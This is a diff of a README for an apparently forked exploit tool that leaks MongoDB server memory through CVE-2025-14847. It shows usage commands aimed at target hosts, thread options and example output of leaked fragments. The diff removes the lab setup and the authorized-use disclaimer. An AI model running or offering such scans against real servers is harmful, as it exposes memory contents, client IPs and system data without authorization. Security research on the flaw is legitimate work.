@@ -1,6 +1,18 @@
-# mongobleed
+# fastmongobleed
 
 **CVE-2025-14847** - MongoDB Unauthenticated Memory Leak Exploit
+
+Forked from [original mongobleed](https://github.com/joedesimone/mongobleed) by Joe Desimone ([@dez_](https://x.com/dez_))  
+**Fork by:** SirBugs (Fares Walid)
+
+## Enhancements in this Fork
+
+- **Multithreading**: 10x faster scanning with configurable thread count (default: 10 threads)
+- **Real-time progress**: Live progress bar showing completion percentage and leaked bytes
+- **Vulnerability checker**: `check_vuln.py` tests actual vulnerability with 3 offsets instead of version guessing
+- **Better error handling**: Cleaner connection handling and timeout management
+
+---
 
 A proof-of-concept exploit for the MongoDB zlib decompression vulnerability that allows unauthenticated attackers to leak sensitive server memory.
 
@@ -26,15 +38,19 @@ A flaw in MongoDB's zlib message decompression returns the allocated buffer size
 
 ## Usage
 
+**Full memory extraction:**
 ```bash
-# Basic scan (offsets 20-8192)
-python3 mongobleed.py --host <target>
+# Basic scan (offsets 20-8192, 10 threads)
+python3 bleed.py --host <target>
+
+# Faster with more threads
+python3 bleed.py --host <target> --threads 20
 
 # Deep scan for more data
-python3 mongobleed.py --host <target> --max-offset 50000
+python3 bleed.py --host <target> --max-offset 50000
 
 # Custom range
-python3 mongobleed.py --host <target> --min-offset 100 --max-offset 20000
+python3 bleed.py --host <target> --min-offset 100 --max-offset 20000
 ```
 
 ## Options
@@ -43,34 +59,48 @@ python3 mongobleed.py --host <target> --min-offset 100 --max-offset 20000
 |--------|---------|-------------|
 | `--host` | localhost | Target MongoDB host |
 | `--port` | 27017 | Target MongoDB port |
+| `--threads` | 10 | Number of concurrent threads |
 | `--min-offset` | 20 | Minimum document length to probe |
 | `--max-offset` | 8192 | Maximum document length to probe |
 | `--output` | leaked.bin | Output file for leaked data |
 
 ## Example Output
 
+**Vulnerability Check:**
+```
+============================================================
+  CVE-2025-14847 MongoDB Vulnerability Checker
+  Author: SirBugs (Fares Walid)
+============================================================
+
+Target: 192.168.1.100:27017
+
+[*] Testing connection...
+[+] Server responded (158 bytes)
+[+] MongoDB server detected
+
+[*] Testing for CVE-2025-14847...
+[*] Trying exploit offsets...
+
+
+**Full Extraction:**
 ```
 [*] mongobleed - CVE-2025-14847 MongoDB Memory Leak
-[*] Author: Joe Desimone - x.com/dez_
-[*] Target: localhost:27017
-[*] Scanning offsets 20-50000
+[*] Original Author: Joe Desimone - x.com/dez_
+[*] Modified by: SirBugs (Fares Walid)
+[*] Target: 192.168.1.100:27017
+[*] Scanning offsets 20-8192
+[*] Using 10 threads
 
+[*] Testing connection to 192.168.1.100:27017... OK (158 bytes)
+
+[*] Progress: 45.2% (3695/8172) - Leaks: 127 (15847 bytes)
 [+] offset=  117 len=  39: ssions^\u0001�r��*YDr���
 [+] offset=16582 len=1552: MemAvailable:    8554792 kB\nBuffers: ...
-[+] offset=18731 len=3908: Recv SyncookiesFailed EmbryonicRsts ...
 
-[*] Total leaked: 8748 bytes
-[*] Unique fragments: 42
+[*] Total leaked: 15847 bytes
+[*] Unique fragments: 127
 [*] Saved to: leaked.bin
-```
-
-## Test Environment
-
-A Docker Compose file is included to spin up a vulnerable MongoDB instance:
-
-```bash
-docker-compose up -d
-python3 mongobleed.py
 ```
 
 ## How It Works
@@ -83,17 +113,3 @@ Leaked data may include:
 - System `/proc` data (meminfo, network stats)
 - Docker container paths
 - Connection UUIDs and client IPs
-
-## References
-
-- [OX Security Advisory](https://www.ox.security/blog/attackers-could-exploit-zlib-to-exfiltrate-data-cve-2025-14847/)
-- [MongoDB Fix Commit](https://github.com/mongodb/mongo/commit/505b660a14698bd2b5233bd94da3917b585c5728)
-
-## Author
-
-Joe Desimone - [x.com/dez_](https://x.com/dez_)
-
-## Disclaimer
-
-This tool is for authorized security testing only. Unauthorized access to computer systems is illegal.
-
